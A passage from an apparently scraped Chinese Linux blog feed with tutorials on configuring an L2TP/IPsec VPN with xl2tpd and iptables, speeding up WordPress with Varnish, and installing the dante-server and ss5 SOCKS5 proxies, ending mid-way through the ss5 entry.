<p><div class="line number1 index0 alt2"><code>Checking ``for</code> <code>IPsec support ``in</code> <code>kernel                                [OK]</code></div></p>
<p><div class="line number2 index1 alt1"><code>SAref kernel support                                 [N``/A``]</code></div></p>
<p><div class="line number3 index2 alt2"><code>NETKEY: Testing XFRM related proc values                                [OK]</code></div></p>
<p><div class="line number4 index3 alt1"><code>[OK]</code></div></p>
<p><div class="line number5 index4 alt2"><code>[FAILED] Please ``enable</code> <code>/proc/sys/net/core/xfrm_larval_drop</code></div></p>
<p><div class="line number6 index5 alt1"><code>or NETKEY will cause non-POSIX compliant long ``time``-outsChecking that pluto is running                                [OK]</code></div><br><br><br><br><br><br><br>出这毛病，照着说明，</p>
<p><div></div></p>
<p><div id="highlighter_166629" class="syntaxhighlighter notranslate shell"></div></p>
<p><table border="0" cellspacing="0" cellpadding="0"></table></p>
<p><tbody></tbody></p>
<p><tr></tr></p>
<p><td class="gutter"></td></p>
<p><div class="line number1 index0 alt2">1</div></p>
<p><div class="line number2 index1 alt1">2</div></p>
<p><td class="code"></td></p>
<p><div class="container"></div></p>
<p><div class="line number1 index0 alt2"><code>echo</code> <code>1 &amp;gt; ``/proc/sys/net/core/xfrm_larval_drop</code></div></p>
<p><div class="line number2 index1 alt1"><code>vi</code> <code>/etc/bashrc</code></div><br><br><br><br><br><br><br>然后把“echo 1 &gt; /proc/sys/net/core/xfrm_larval_drop”这句加进去。以后每次开机自动执行一下。</p>
<p>&nbsp;</p>
<p><strong>4. 编辑 /etc/xl2tpd/xl2tpd.conf</strong></p>
<p>vi /etc/xl2tpd/xl2tpd.conf</p>
<p><div></div></p>
<p><div id="highlighter_290143" class="syntaxhighlighter notranslate shell"></div></p>
<p><table border="0" cellspacing="0" cellpadding="0"></table></p>
<p><tbody></tbody></p>
<p><tr></tr></p>
<p><td class="gutter"></td></p>
<p><div class="line number1 index0 alt2">1</div></p>
<p><div class="line number2 index1 alt1">2</div></p>
<p><div class="line number3 index2 alt2">3</div></p>
<p><div class="line number4 index3 alt1">4</div></p>
<p><div class="line number5 index4 alt2">5</div></p>
<p><div class="line number6 index5 alt1">6</div></p>
<p><div class="line number7 index6 alt2">7</div></p>
<p><div class="line number8 index7 alt1">8</div></p>
<p><div class="line number9 index8 alt2">9</div></p>
<p><div class="line number10 index9 alt1">10</div></p>
<p><div class="line number11 index10 alt2">11</div></p>
<p><div class="line number12 index11 alt1">12</div></p>
<p><div class="line number13 index12 alt2">13</div></p>
<p><div class="line number14 index13 alt1">14</div></p>
<p><div class="line number15 index14 alt2">15</div></p>
<p><div class="line number16 index15 alt1">16</div></p>
<p><div class="line number17 index16 alt2">17</div></p>
<p><div class="line number18 index17 alt1">18</div></p>
<p><div class="line number19 index18 alt2">19</div></p>
<p><div class="line number20 index19 alt1">20</div></p>
<p><div class="line number21 index20 alt2">21</div></p>
<p><div class="line number22 index21 alt1">22</div></p>
<p><div class="line number23 index22 alt2">23</div></p>
<p><div class="line number24 index23 alt1">24</div></p>
<p><div class="line number25 index24 alt2">25</div></p>
<p><div class="line number26 index25 alt1">26</div></p>
<p><div class="line number27 index26 alt2">27</div></p>
<p><div class="line number28 index27 alt1">28</div></p>
<p><div class="line number29 index28 alt2">29</div></p>
<p><div class="line number30 index29 alt1">30</div></p>
<p><div class="line number31 index30 alt2">31</div></p>
<p><div class="line number32 index31 alt1">32</div></p>
<p><div class="line number33 index32 alt2">33</div></p>
<p><div class="line number34 index33 alt1">34</div></p>
<p><div class="line number35 index34 alt2">35</div></p>
<p><div class="line number36 index35 alt1">36</div></p>
<p><div class="line number37 index36 alt2">37</div></p>
<p><div class="line number38 index37 alt1">38</div></p>
<p><div class="line number39 index38 alt2">39</div></p>
<p><div class="line number40 index39 alt1">40</div></p>
<p><td class="code"></td></p>
<p><div class="container"></div></p>
<p><div class="line number1 index0 alt2"><code>; This is a minimal sample xl2tpd configuration ``file</code> <code>for</code> <code>use</code></div></p>
<p><div class="line number2 index1 alt1"><code>; with L2TP over IPsec.</code></div></p>
<p><div class="line number3 index2 alt2"><code>;</code></div></p>
<p><div class="line number4 index3 alt1"><code>; The idea is to provide an L2TP daemon to ``which</code> <code>remote Windows L2TP``/IPsec</code></div></p>
<p><div class="line number5 index4 alt2"><code>; clients connect. In this example, the internal (protected) network</code></div></p>
<p><div class="line number6 index5 alt1"><code>; is 192.168.1.0``/24``. A special IP range within this network is reserved</code></div></p>
<p><div class="line number7 index6 alt2"><code>; ``for</code> <code>the remote clients: 192.168.1.128``/25</code></div></p>
<p><div class="line number8 index7 alt1"><code>; (i.e. 192.168.1.128 ... 192.168.1.254)</code></div></p>
<p><div class="line number9 index8 alt2"><code>;</code></div></p>
<p><div class="line number10 index9 alt1"><code>; The listen-addr parameter can be used ``if</code> <code>you want to bind the L2TP daemon</code></div></p>
<p><div class="line number11 index10 alt2"><code>; to a specific IP address instead of to all interfaces. For instance,</code></div></p>
<p><div class="line number12 index11 alt1"><code>; you could bind it to the interface of the internal LAN (e.g. 192.168.1.98</code></div></p>
<p><div class="line number13 index12 alt2"><code>; ``in</code> <code>the example below). Yet another IP address (``local</code> <code>ip, e.g. 192.168.1.99)</code></div></p>
<p><div class="line number14 index13 alt1"><code>; will be used by xl2tpd as its address on pppX interfaces.[global]</code></div></p>
<p><div class="line number15 index14 alt2"><code>listen-addr = esojourn.org</code></div></p>
<p><div class="line number16 index15 alt1"><code>;这里写内网IP。或者加;注释掉也问题不大。</code></div></p>
<p><div class="line number17 index16 alt2"><code>;</code></div></p>
<p><div class="line number18 index17 alt1"><code>; requires openswan-2.5.18 or higher - Also does not yet work ``in</code> <code>combination</code></div></p>
<p><div class="line number19 index18 alt2"><code>; with kernel mode l2tp as present ``in</code> <code>linux 2.6.23+</code></div></p>
<p><div class="line number20 index19 alt1"><code>; ipsec saref = ``yes</code></div></p>
<p><div class="line number21 index20 alt2"><code>ipsec saref = no</code></div></p>
<p><div class="line number22 index21 alt1"><code>; 这里一般都让写``yes``，但如果刚才你的ipsec verify中，有报SAref kernel support[N``/A``]的话，这里就写no。</code></div></p>
<p><div class="line number23 index22 alt2"><code>; Use refinfo of 22 ``if</code> <code>using an SAref kernel patch based on openswan 2.6.35 or</code></div></p>
<p><div class="line number24 index23 alt1"><code>;when using any of the SAref kernel patches ``for</code> <code>kernels up to 2.6.35.</code></div></p>
<p><div class="line number25 index24 alt2"><code>; ipsec refinfo = 30</code></div></p>
<p><div class="line number26 index25 alt1"><code>;</code></div></p>
<p><div class="line number27 index26 alt2"><code>; forceuserspace = ``yes</code></div></p>
<p><div class="line number28 index27 alt1"><code>;</code></div></p>
<p><div class="line number29 index28 alt2"><code>; debug tunnel = ``yes``[lns default]</code></div></p>
<p><div class="line number30 index29 alt1"><code>ip range = 192.168.7.128-192.168.7.254</code></div></p>
<p><div class="line number31 index30 alt2"><code>;这里写vpn client的ip段</code></div></p>
<p><div class="line number32 index31 alt1"><code>local</code> <code>ip = 192.168.7.1</code></div></p>
<p><div class="line number33 index32 alt2"></div></p>
<p><div class="line number34 index33 alt1"><code>require chap = ``yes</code></div></p>
<p><div class="line number35 index34 alt2"><code>refuse pap = ``yes</code></div></p>
<p><div class="line number36 index35 alt1"><code>require authentication = ``yes</code></div></p>
<p><div class="line number37 index36 alt2"><code>name = LinuxVPNserver</code></div></p>
<p><div class="line number38 index37 alt1"><code>ppp debug = ``yes</code></div></p>
<p><div class="line number39 index38 alt2"><code>pppoptfile = ``/etc/ppp/options``.xl2tpd</code></div></p>
<p><div class="line number40 index39 alt1"><code>length bit = ``yes</code></div><br><br><br><br><br><br><br>&nbsp;</p>
<p><strong>5. 修改 /etc/ppp/options.xl2tpd</strong></p>
<p>vi /etc/ppp/options.xl2tpd</p>
<p><div></div></p>
<p><div id="highlighter_100842" class="syntaxhighlighter notranslate shell"></div></p>
<p><table border="0" cellspacing="0" cellpadding="0"></table></p>
<p><tbody></tbody></p>
<p><tr></tr></p>
<p><td class="gutter"></td></p>
<p><div class="line number1 index0 alt2">1</div></p>
<p><div class="line number2 index1 alt1">2</div></p>
<p><div class="line number3 index2 alt2">3</div></p>
<p><div class="line number4 index3 alt1">4</div></p>
<p><div class="line number5 index4 alt2">5</div></p>
<p><div class="line number6 index5 alt1">6</div></p>
<p><div class="line number7 index6 alt2">7</div></p>
<p><div class="line number8 index7 alt1">8</div></p>
<p><div class="line number9 index8 alt2">9</div></p>
<p><div class="line number10 index9 alt1">10</div></p>
<p><div class="line number11 index10 alt2">11</div></p>
<p><div class="line number12 index11 alt1">12</div></p>
<p><div class="line number13 index12 alt2">13</div></p>
<p><div class="line number14 index13 alt1">14</div></p>
<p><div class="line number15 index14 alt2">15</div></p>
<p><div class="line number16 index15 alt1">16</div></p>
<p><td class="code"></td></p>
<p><div class="container"></div></p>
<p><div class="line number1 index0 alt2"><code>require-mschap-v2</code></div></p>
<p><div class="line number2 index1 alt1"><code>ipcp-accept-``local</code></div></p>
<p><div class="line number3 index2 alt2"><code>ipcp-accept-remote</code></div></p>
<p><div class="line number4 index3 alt1"><code>ms-dns 8.8.4.4</code></div></p>
<p><div class="line number5 index4 alt2"><code>ms-dns 8.8.8.8</code></div></p>
<p><div class="line number6 index5 alt1"><code>noccp</code></div></p>
<p><div class="line number7 index6 alt2"><code>auth</code></div></p>
<p><div class="line number8 index7 alt1"><code>crtscts</code></div></p>
<p><div class="line number9 index8 alt2"><code>idle 1800</code></div></p>
<p><div class="line number10 index9 alt1"><code>mtu 1410</code></div></p>
<p><div class="line number11 index10 alt2"><code>mru 1410</code></div></p>
<p><div class="line number12 index11 alt1"><code>nodefaultroute</code></div></p>
<p><div class="line number13 index12 alt2"><code>debug</code></div></p>
<p><div class="line number14 index13 alt1"><code>lock</code></div></p>
<p><div class="line number15 index14 alt2"><code>proxyarp</code></div></p>
<p><div class="line number16 index15 alt1"><code>connect-delay 5000</code></div><br><br><br><br><br><br><br>vi /etc/ppp/chap-secrets</p>
<p><div></div></p>
<p><div id="highlighter_46133" class="syntaxhighlighter notranslate shell"></div></p>
<p><table border="0" cellspacing="0" cellpadding="0"></table></p>
<p><tbody></tbody></p>
<p><tr></tr></p>
<p><td class="gutter"></td></p>
<p><div class="line number1 index0 alt2">1</div></p>
<p><div class="line number2 index1 alt1">2</div></p>
<p><div class="line number3 index2 alt2">3</div></p>
<p><td class="code"></td></p>
<p><div class="container"></div></p>
<p><div class="line number1 index0 alt2"><code>#文件格式</code></div></p>
<p><div class="line number2 index1 alt1"><code># user server password ip</code></div></p>
<p><div class="line number3 index2 alt2"><code>username * userpass * ``#改成你的用户名 密码</code></div><br><br><br><br><br><br><br>&nbsp;</p>
<p><strong>6. 最关键的iptables配置</strong></p>
<p>做完上面这堆步骤之后，客户端建个连接就可以验证进入vpn主机了。但是无法访问内外网。我就是在这里卡了一个多星期。网上的资料，有的没说这一步。有的说了也没说全。我发个权威的吧。</p>
<p><div></div></p>
<p><div id="highlighter_703315" class="syntaxhighlighter notranslate shell"></div></p>
<p><table border="0" cellspacing="0" cellpadding="0"></table></p>
<p><tbody></tbody></p>
<p><tr></tr></p>
<p><td class="gutter"></td></p>
<p><div class="line number1 index0 alt2">1</div></p>
<p><div class="line number2 index1 alt1">2</div></p>
<p><div class="line number3 index2 alt2">3</div></p>
<p><div class="line number4 index3 alt1">4</div></p>
<p><div class="line number5 index4 alt2">5</div></p>
<p><td class="code"></td></p>
<p><div class="container"></div></p>
<p><div class="line number1 index0 alt2"><code>iptables -t nat -A POSTROUTING -s 192.168.7.0``/24</code> <code>-o eth0 -j MASQUERADE</code></div></p>
<p><div class="line number2 index1 alt1"><code>iptables -I FORWARD -s 192.168.7.0``/24</code> <code>-j ACCEPT</code></div></p>
<p><div class="line number3 index2 alt2"><code>iptables -I FORWARD -d 192.168.7.0``/24</code> <code>-j ACCEPT</code></div></p>
<p><div class="line number4 index3 alt1"><code>iptables-save</code></div></p>
<p><div class="line number5 index4 alt2"><code>service iptables restart</code></div><br><br><br><br><br><br><br>192.168.7.0/24根据实际情况替换。</p>
<p>vi /etc/sysconfig/iptables 看到的应该是类似这样。<br>最上面先是nat规则，下面是filter规则。<br>下面filter表里，先把VPN要用到的udp端口1701，500，4500都打开。要用openvp的话，还要开1194。<br>另外filter表里，一定要有FORWARD规则。这点在网上好几个教程里都没说！坑死人。</p>
<p><div></div></p>
<p><div id="highlighter_657828" class="syntaxhighlighter notranslate shell"></div></p>
<p><table border="0" cellspacing="0" cellpadding="0"></table></p>
<p><tbody></tbody></p>
<p><tr></tr></p>
<p><td class="gutter"></td></p>
<p><div class="line number1 index0 alt2">1</div></p>
<p><div class="line number2 index1 alt1">2</div></p>
<p><div class="line number3 index2 alt2">3</div></p>
<p><div class="line number4 index3 alt1">4</div></p>
<p><div class="line number5 index4 alt2">5</div></p>
<p><div class="line number6 index5 alt1">6</div></p>
<p><div class="line number7 index6 alt2">7</div></p>
<p><div class="line number8 index7 alt1">8</div></p>
<p><div class="line number9 index8 alt2">9</div></p>
<p><div class="line number10 index9 alt1">10</div></p>
<p><div class="line number11 index10 alt2">11</div></p>
<p><div class="line number12 index11 alt1">12</div></p>
<p><div class="line number13 index12 alt2">13</div></p>
<p><div class="line number14 index13 alt1">14</div></p>
<p><div class="line number15 index14 alt2">15</div></p>
<p><div class="line number16 index15 alt1">16</div></p>
<p><div class="line number17 index16 alt2">17</div></p>
<p><div class="line number18 index17 alt1">18</div></p>
<p><div class="line number19 index18 alt2">19</div></p>
<p><div class="line number20 index19 alt1">20</div></p>
<p><div class="line number21 index20 alt2">21</div></p>
<p><div class="line number22 index21 alt1">22</div></p>
<p><div class="line number23 index22 alt2">23</div></p>
<p><div class="line number24 index23 alt1">24</div></p>
<p><div class="line number25 index24 alt2">25</div></p>
<p><div class="line number26 index25 alt1">26</div></p>
<p><div class="line number27 index26 alt2">27</div></p>
<p><div class="line number28 index27 alt1">28</div></p>
<p><div class="line number29 index28 alt2">29</div></p>
<p><td class="code"></td></p>
<p><div class="container"></div></p>
<p><div class="line number1 index0 alt2"><code>#下面规则做参考啊，新手别完全照抄。</code></div></p>
<p><div class="line number2 index1 alt1"><code>*nat</code></div></p>
<p><div class="line number3 index2 alt2"><code>:PREROUTING ACCEPT [39:3503]</code></div></p>
<p><div class="line number4 index3 alt1"><code>:POSTROUTING ACCEPT [0:0]</code></div></p>
<p><div class="line number5 index4 alt2"><code>:OUTPUT ACCEPT [0:0]</code></div></p>
<p><div class="line number6 index5 alt1"><code>-A POSTROUTING -s 192.168.7.0``/24</code> <code>-o eth0 -j MASQUERADE</code></div></p>
<p><div class="line number7 index6 alt2"><code>COMMIT</code></div></p>
<p><div class="line number8 index7 alt1"><code># Completed on Thu Jun 28 15:50:40 2012</code></div></p>
<p><div class="line number9 index8 alt2"><code># Generated by iptables-save v1.4.7 on Thu Jun 28 15:50:40 2012</code></div></p>
<p><div class="line number10 index9 alt1"><code>*filter</code></div></p>
<p><div class="line number11 index10 alt2"><code>:INPUT ACCEPT [0:0]</code></div></p>
<p><div class="line number12 index11 alt1"><code>:FORWARD ACCEPT [0:0]</code></div></p>
<p><div class="line number13 index12 alt2"><code>:OUTPUT ACCEPT [121:13264]</code></div></p>
<p><div class="line number14 index13 alt1"><code>-A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT</code></div></p>
<p><div class="line number15 index14 alt2"><code>-A INPUT -p icmp -j ACCEPT</code></div></p>
<p><div class="line number16 index15 alt1"><code>-A INPUT -i lo -j ACCEPT</code></div></p>
<p><div class="line number17 index16 alt2"><code>-A INPUT -p tcp -m state --state NEW -m tcp --dport 22 -j ACCEPT</code></div></p>
<p><div class="line number18 index17 alt1"><code>-A INPUT -p tcp -m state --state NEW -m tcp --dport 80 -j ACCEPT</code></div></p>
<p><div class="line number19 index18 alt2"><code>-A INPUT -p tcp -m state --state NEW -m tcp --dport 53 -j ACCEPT</code></div></p>
<p><div class="line number20 index19 alt1"><code>-A INPUT -p udp -m state --state NEW -m udp --dport 53 -j ACCEPT</code></div></p>
<p><div class="line number21 index20 alt2"><code>-A INPUT -p tcp -m state --state NEW -m tcp --dport 1194 -j ACCEPT</code></div></p>
<p><div class="line number22 index21 alt1"><code>-A INPUT -p udp -m state --state NEW -m udp --dport 1701 -j ACCEPT</code></div></p>
<p><div class="line number23 index22 alt2"><code>-A INPUT -p udp -m state --state NEW -m udp --dport 500 -j ACCEPT</code></div></p>
<p><div class="line number24 index23 alt1"><code>-A INPUT -p udp -m state --state NEW -m udp --dport 4500 -j ACCEPT-A INPUT -j REJECT --reject-with icmp-host-prohibited</code></div></p>
<p><div class="line number25 index24 alt2"><code>-A FORWARD -d 192.168.7.0``/24</code> <code>-j ACCEPT</code></div></p>
<p><div class="line number26 index25 alt1"><code>-A FORWARD -s 192.168.7.0``/24</code> <code>-j ACCEPT</code></div></p>
<p><div class="line number27 index26 alt2"><code>-A FORWARD -j REJECT --reject-with icmp-host-prohibited</code></div></p>
<p><div class="line number28 index27 alt1"><code>COMMIT</code></div></p>
<p><div class="line number29 index28 alt2"><code># Completed on Thu Jun 28 15:50:40 2012</code></div><br><br><br><br><br><br><br>最后</p>
<p><div></div></p>
<p><div id="highlighter_717937" class="syntaxhighlighter notranslate shell"></div></p>
<p><table border="0" cellspacing="0" cellpadding="0"></table></p>
<p><tbody></tbody></p>
<p><tr></tr></p>
<p><td class="gutter"></td></p>
<p><div class="line number1 index0 alt2">1</div></p>
<p><div class="line number2 index1 alt1">2</div></p>
<p><div class="line number3 index2 alt2">3</div></p>
<p><div class="line number4 index3 alt1">4</div></p>
<p><div class="line number5 index4 alt2">5</div></p>
<p><td class="code"></td></p>
<p><div class="container"></div></p>
<p><div class="line number1 index0 alt2"><code>service xl2tpd restart</code></div></p>
<p><div class="line number2 index1 alt1"><code>service iptables restart</code></div></p>
<p><div class="line number3 index2 alt2"><code>chkconfig xl2tpd on</code></div></p>
<p><div class="line number4 index3 alt1"><code>chkconfig iptables on</code></div></p>
<p><div class="line number5 index4 alt2"><code>chkconfig ipsec on</code></div><br><br><br><br><br><br><br>&nbsp;</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[CentOS服务器给WordPress安装Varnish加速]]></title>
      <url>http://www.linux52.com/2015-10-04-centos-e6-9c-8d-e5-8a-a1-e5-99-a8-e7-bb-99wordpress-e5-ae-89-e8-a3-85varnish-e5-8a-a0-e9-80-9f.html</url>
      <content type="html"><![CDATA[<p>Varnish是一款高性能的开源HTTP加速器，挪威最大的在线报纸Verdens Gang (<a href="http://www.vg.no" target="_blank" rel="external">http://www.vg.no</a>) 使用3台Varnish代替了原来的12台squid，性能居然比以前更好。可见Varnish是一个相当强大的加速器。下面罗伊给大家介绍如何在CentOS上安装Varnish来给你的WordPress博客加速。<br>1，安装Varnsih<br>使用SSH登录你的VPS，执行下面的命令来安装Varnish：</p>
<pre>yum install varnish</pre>
然后我们启动Varnish：
<pre>/etc/init.d/varnish start</pre>
设置为开机启动：
<pre>chkconfig –level 345 varnish on</pre>
2，配置Varnish
打开default.vcl：
<pre>nano /etc/varnish/default.vcl</pre>
确认默认的default.vcl和下面的代码相匹配：
<pre class="prettyprint lang-cpp linenums"># Back-End
backend default {
.host = "127.0.0.1";
.port = "80";
.connect_timeout = 60s;
.first_byte_timeout = 10s;
.between_bytes_timeout = 10s;
}

# Custom
sub vcl_recv {
remove req.http.X-Forwarded-For;
set req.http.X-Forwarded-For = client.ip;

if (req.url ~ "^/wp-(login|admin)") {
return (pipe);
}

if (req.http.Cookie ~"(wp-postpass|wordpress_logged_in|comment_author_)") {
return (pipe);
}

if (req.request == "POST") {
return (pass);
}

if (req.http.Cache-Control ~ "no-cache") {
return (pass);
}

if (req.http.Authorization) {
return (pass);
}

if (req.url ~ "\.(jpg|jpeg|gif|png|ico|css|zip|tgz|gz|rar|bz2|pd f|txt|tar|wav|bmp|rtf|js|flv|swf|htm|html)$") {
unset req.http.Cookie;
unset req.http.Accept-Encoding;
unset req.http.Vary;
return (lookup);
}

if (req.http.Accept-Encoding) {
if (req.url ~ "\.(jpg|png|gif|gz|tgz|bz2|tbz|mp3|ogg)$") {
remove req.http.Accept-Encoding;
} elsif (req.http.Accept-Encoding ~ "gzip") {
set req.http.Accept-Encoding = "gzip";
} elsif (req.http.Accept-Encoding ~ "deflate") {
set req.http.Accept-Encoding = "deflate";
} else {
remove req.http.Accept-Encoding;
}
}

if (req.backend.healthy) {
set req.grace = 30s;
} else {
set req.grace = 1h;
}

unset req.http.Cookie;
unset req.http.Vary;
return (lookup);
}

sub vcl_fetch {
set beresp.grace = 1h;
unset beresp.http.set-cookie;
if (req.url ~ "\.(jpg|jpeg|gif|png|ico|css|zip|tgz|gz|rar|bz2|pd f|txt|tar|wav|bmp|rtf|js|flv|swf|htm|html)$") {
set beresp.ttl = 24h;
} else {
set beresp.ttl = 5m;
}
return (deliver);
}

sub vcl_deliver {
if(obj.hits &gt; 0) {
set resp.http.X-Cache = "HIT";
} else {
set resp.http.X-Cache = "MISS";
}
set resp.http.Cache-Control = "private";
set resp.http.Pragma = "private";
remove resp.http.X-Varnish;
remove resp.http.Via;
remove resp.http.Age;
remove resp.http.Server;
remove resp.http.X-Powered-By;
}

sub vcl_pipe {
set bereq.http.connection = "close";
}</pre>
重启Varnish使其生效：
<pre>/etc/init.d/varnish restart</pre>]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Debian/Ubuntu安装socks5代理服务器dante-server]]></title>
      <url>http://www.linux52.com/2015-10-01-ubuntudebain-ss5dante-server.html</url>
      <content type="html"><![CDATA[<p>dante-server是一个很好的socks4/5代理服务器软件。本文介绍如何安装与配置：</p>
<p>1、使用apt-get安装</p>
<blockquote>
<p>apt-get install dante-server<br>2、如果你使用的是Ubuntu 64位系统，执行以下操作：</p>
</blockquote>
<p>cd /lib/x86_64-linux-gnu/<br>ln -s libc.so.6 libc.so</p>
<p>3、添加一个用户</p>
<blockquote>
<p>useradd proxyuser</p>
<p>passwd proxyuser<br>4、禁止proxyuser用户登录系统（安全考虑）<br>vi /etc/passwd<br>将proxyuser的shell改成 /bin/false</p>
</blockquote>
<p>5、配置danted.conf</p>
<blockquote>
<p>vi /etc/danted.conf<br>输入以下内容（原来danted.conf的内容都不要）：<br>logoutput: /var/log/sockd.log</p>
<p>internal: eth0 port = 10080</p>
<p>external: eth0</p>
<p>method: username</p>
<p>clientmethod: none</p>
<p>user.privileged: root</p>
<p>user.notprivileged: proxyuser</p>
<p>user.libwrap: nobody</p>
<p>compatibility: sameport</p>
<p>compatibility: reuseaddr</p>
<p>extension: bind</p>
<p>client pass {</p>
<p>from: 0.0.0.0/0 to: 0.0.0.0/0</p>
<p>}</p>
<p>pass {</p>
<p>from: 0.0.0.0/0 to: 0.0.0.0/0</p>
<p>protocol: tcp</p>
<p>}<br>6、启动dante-server<br>/etc/init.d/danted start<br>7、查看是否监听成功：<br>netstat -anp | grep 10080<br>现在你就可以使用socks5了</p>
</blockquote>
<p>&nbsp;</p>
<h1 id="dante-server在64位Ubuntu上无法运行的解决办法"><a href="#dante-server在64位Ubuntu上无法运行的解决办法" class="headerlink" title="dante-server在64位Ubuntu上无法运行的解决办法"></a>dante-server在64位Ubuntu上无法运行的解决办法</h1><p>dante-server是一个很好的socks4/socks5代理服务软件。在64位Ubuntu上运行会有错误日志：</p>
<blockquote>
<p>symbolfunction(): compiletime configuration error?  Failed to open “libc.so”: /usr/lib/x86_64-linux-gnu/libc.so: invalid ELF header<br>出现这种错误解决办法很简单：<br>cd /lib/x86_64-linux-gnu/</p>
<p>ln -s libc.so.6 libc.so<br>操作完即可正常启动dante-server。</p>
</blockquote>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[linux ss5(sock5)代理安装]]></title>
      <url>http://www.linux52.com/2015-10-01-linux-ss5sock5-e4-bb-a3-e7-90-86-e5-ae-89-e8-a3-85.html</url>
      <content type="html"><![CDATA[<p>VPN大家耳熟能详，但是socks用到的人比较少，那什么是socks呢？请看第二段或者百度百科，socks分别有4和5两个版本，现在5为主流。工作中经常用VPN访问国外，但是同时国内的速度又慢了，让人很纠结，实际上这个时候可以考虑使用socks。指定某一个程序使用国外socks即可。这样国内国外速度同时有保证。</p>
<p>SOCKS是什么：防火墙安全会话转换协议 （Socks: Protocol for sessions traversal across firewall securely） SOCKS 协议提供一个框架，为在 TCP 和 UDP 域中的客户机/服务器应用程序能更方便安全地使用网络防火墙所提供的服务。这个协议从概念上来讲是介于应用层和传输层之间的 “中介层（shim-layer）”，因而不提供如传递 ICMP 信息之类的网络层网关服务。开始我们的socks之旅吧<br>[v_act]<a href="http://sourceforge.net/projects/ss5/下载最新源码" target="_blank" rel="external">http://sourceforge.net/projects/ss5/下载最新源码</a><br>apt-get install libpam0g-dev</p>
<p>apt-get install libldap2-dev</p>
<p>apt-get install libssl-dev</p>
<p>1、修改/etc/opt/ss5/ss5.conf<br>auth 0.0.0.0/0 - u<br>permit u 0.0.0.0/0 - 0.0.0.0/0 - - - - -</p>
<p>3、在/etc/sysconfig/ss5 中，取消注释。<br>SS5_OPTS=” -u root”</p>
<p>4、添加验证用户及密码，由于密码是明文的，注意控制权限。</p>
<h1 id="cat-etc-opt-ss5-ss5-passwd-一行一个用户-密码"><a href="#cat-etc-opt-ss5-ss5-passwd-一行一个用户-密码" class="headerlink" title="cat etc/opt/ss5/ss5.passwd #一行一个用户+密码"></a>cat etc/opt/ss5/ss5.passwd #一行一个用户+密码</h1><p>2、在/etc/rc.d/init.d/ss5 文件修改自定义端口，默认为1080<br>ss5 -t $SS5_OPTS -b 0.0.0.0:8087[/v_act]<br><strong>centos</strong></p>
<p><strong>1. 安装socks 5</strong><br>1.1 安装依赖开发库</p>
<p><div id="crayon-560d1c75676fc730189388" class="crayon-syntax crayon-theme-visual-assist crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover"></div></p>
<p><div class="crayon-main"></div></p>
<p><table class="crayon-table"></table></p>
<p><tbody></tbody></p>
<p><tr class="crayon-row"></tr></p>
<p><td class="crayon-nums " data-settings="hide"></td></p>
<p><div class="crayon-nums-content"></div></p>
<p><div class="crayon-num" data-line="crayon-560d1c75676fc730189388-1">1</div><br></p>
<p><td class="crayon-code"></td></p>
<p><div class="crayon-pre"></div></p>
<p><div id="crayon-560d1c75676fc730189388-1" class="crayon-line"><span class="crayon-p"># yum install pam-devel openldap-devel openssl-devel</span></div><br><br><br><br><br><br><br>1.2 安装socks 5 <a href="http://7xn6ev.com1.z0.glb.clouddn.com//wp-content/uploads/2015/10/201510011455297.gz" target="_blank" rel="external">ss5-3.8.9-8.tar(改下后缀tar.gz)</a></p>
<p><div id="crayon-560d1c756770b915112398" class="crayon-syntax crayon-theme-visual-assist crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover"></div></p>
<p><div class="crayon-main"></div></p>
<p><table class="crayon-table"></table></p>
<p><tbody></tbody></p>
<p><tr class="crayon-row"></tr></p>
<p><td class="crayon-nums " data-settings="hide"></td></p>
<p><div class="crayon-nums-content"></div></p>
<p><div class="crayon-num" data-line="crayon-560d1c756770b915112398-1">1</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-560d1c756770b915112398-2">2</div></p>
<p><div class="crayon-num" data-line="crayon-560d1c756770b915112398-3">3</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-560d1c756770b915112398-4">4</div></p>
<p><div class="crayon-num" data-line="crayon-560d1c756770b915112398-5">5</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-560d1c756770b915112398-6">6</div><br></p>
<p><td class="crayon-code"></td></p>
<p><div class="crayon-pre"></div></p>
<p><div id="crayon-560d1c756770b915112398-1" class="crayon-line"><span class="crayon-p"># wget <a href="http://downloads.sourceforge.net/project/ss5/ss5/3.8.9-8/ss5-3.8.9-8.tar.gz?r=&amp;ts=1396802581&amp;use_mirror=cznic" target="_blank" rel="external">http://downloads.sourceforge.net/project/ss5/ss5/3.8.9-8/ss5-3.8.9-8.tar.gz?r=&amp;ts=1396802581&amp;use_mirror=cznic</a></span></div></p>
<p><div id="crayon-560d1c756770b915112398-2" class="crayon-line crayon-striped-line"><span class="crayon-p"># tar -xzvf ss5-3.8.9-8.tar.gz</span></div></p>
<p><div id="crayon-560d1c756770b915112398-3" class="crayon-line"><span class="crayon-p"># cd ss5-3.8.9</span></div></p>
<p><div id="crayon-560d1c756770b915112398-4" class="crayon-line crayon-striped-line"><span class="crayon-p"># ./configure</span></div></p>
<p><div id="crayon-560d1c756770b915112398-5" class="crayon-line"><span class="crayon-p"># make</span></div></p>
<p><div id="crayon-560d1c756770b915112398-6" class="crayon-line crayon-striped-line"><span class="crayon-p"># make install</span></div><br><br><br><br><br><br><br><strong>2. socks 5配置</strong><br>2.1 修改配置文件</p>
<p><div id="crayon-560d1c756770f804786072" class="crayon-syntax crayon-theme-visual-assist crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover"></div></p>
<p><div class="crayon-plain-wrap"></div></p>
<p><div class="crayon-main"></div></p>
<p><table class="crayon-table"></table></p>
<p><tbody></tbody></p>
<p><tr class="crayon-row"></tr></p>
<p><td class="crayon-nums " data-settings="hide"></td></p>
<p><div class="crayon-nums-content"></div></p>
<p><div class="crayon-num" data-line="crayon-560d1c756770f804786072-1">1</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-560d1c756770f804786072-2">2</div></p>
<p><div class="crayon-num" data-line="crayon-560d1c756770f804786072-3">3</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-560d1c756770f804786072-4">4</div></p>
<p><div class="crayon-num" data-line="crayon-560d1c756770f804786072-5">5</div></p>
